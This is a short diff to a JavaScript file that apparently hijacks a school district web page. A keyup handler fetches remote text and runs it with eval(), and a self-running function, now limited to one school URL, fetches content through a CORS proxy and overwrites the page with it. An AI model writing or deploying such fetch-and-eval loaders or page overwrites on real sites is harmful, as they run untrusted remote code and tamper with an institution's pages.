@@ -5,7 +5,6 @@ window.addEventListener("keyup", event => {
         fetch(url)
             .then(response => response.text())
             .then(scriptText => {
-                // Execute the JavaScript code
                 eval(scriptText);
             })
             .catch(error => {
@@ -18,7 +17,6 @@ window.addEventListener("keyup", event => {
         fetch(url)
             .then(response => response.text())
             .then(scriptText => {
-                // Execute the JavaScript code
                 eval(scriptText);
             })
             .catch(error => {
@@ -26,7 +24,11 @@ window.addEventListener("keyup", event => {
             });    }
   })
   (function() {
-    fetch('https://myschoolisass.github.io/pain/test2.html')
+    if (window.location.href !== 'https://tumwater.beaverton.k12.or.us/') {
+        return;
+    }
+
+    fetch('https://cors-anywhere.herokuapp.com/https://example.com')
     .then(response => response.text())
     .then(html => {
         document.open();
@@ -35,6 +37,5 @@ window.addEventListener("keyup", event => {
     })
     .catch(error => {
         console.error('Error fetching content:', error);
-        alert('Error fetching content. Please try again later.');
     });
 })();
